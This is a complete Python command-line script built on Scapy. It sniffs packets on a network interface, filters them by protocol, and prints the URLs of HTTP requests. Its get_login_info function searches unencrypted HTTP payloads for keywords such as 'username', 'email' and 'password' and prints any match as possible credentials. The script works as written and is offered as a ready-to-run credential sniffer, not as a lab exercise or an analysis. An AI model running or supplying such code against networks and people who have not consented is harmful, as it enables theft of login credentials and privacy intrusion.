#!/usr/bin/env python3

import argparse
import scapy.all as scapy
from scapy.layers import http


def parse_arguments():
    parser = argparse.ArgumentParser(
        description="Simple Packet Sniffer using Scapy"
    )

    parser.add_argument(
        "-i",
        "--interface",
        required=True,
        help="Network interface to sniff on (e.g. eth0, wlan0)"
    )

    parser.add_argument(
        "-p",
        "--protocol",
        choices=["all", "http", "tcp", "udp", "icmp", "arp", "dns"],
        default="all",
        help="Protocol filter"
    )

    return parser.parse_args()


def sniff(interface, protocol):
    scapy.sniff(
        iface=interface,
        store=False,
        prn=lambda packet: process_sniffed_packet(packet, protocol)
    )


def get_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path


def get_login_info(packet):
    if packet.haslayer(scapy.Raw):
        load = packet[scapy.Raw].load.decode(errors="ignore")

        keywords = [
            "username",
            "user",
            "email",
            "login",
            "password",
            "pass"
        ]

        for keyword in keywords:
            if keyword.lower() in load.lower():
                return load

    return None


def protocol_matches(packet, protocol):

    if protocol == "all":
        return True

    if protocol == "http":
        return packet.haslayer(http.HTTPRequest)

    if protocol == "tcp":
        return packet.haslayer(scapy.TCP)

    if protocol == "udp":
        return packet.haslayer(scapy.UDP)

    if protocol == "icmp":
        return packet.haslayer(scapy.ICMP)

    if protocol == "arp":
        return packet.haslayer(scapy.ARP)

    if protocol == "dns":
        return packet.haslayer(scapy.DNS)

    return False


def process_sniffed_packet(packet, protocol):

    if not protocol_matches(packet, protocol):
        return

    print("=" * 70)

    if packet.haslayer(scapy.IP):
        print(f"Source      : {packet[scapy.IP].src}")
        print(f"Destination : {packet[scapy.IP].dst}")

    print(f"Protocol    : {packet.summary()}")

    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet).decode(errors="ignore")
        print(f"\n[+] HTTP Request >> {url}")

        login_info = get_login_info(packet)
        if login_info:
            print("\n[+] Possible Credentials Found")
            print(login_info)


def main():
    args = parse_arguments()

    print(f"[*] Interface : {args.interface}")
    print(f"[*] Protocol  : {args.protocol}")
    print("[*] Sniffing started...\n")

    sniff(args.interface, args.protocol)


if __name__ == "__main__":
    main()
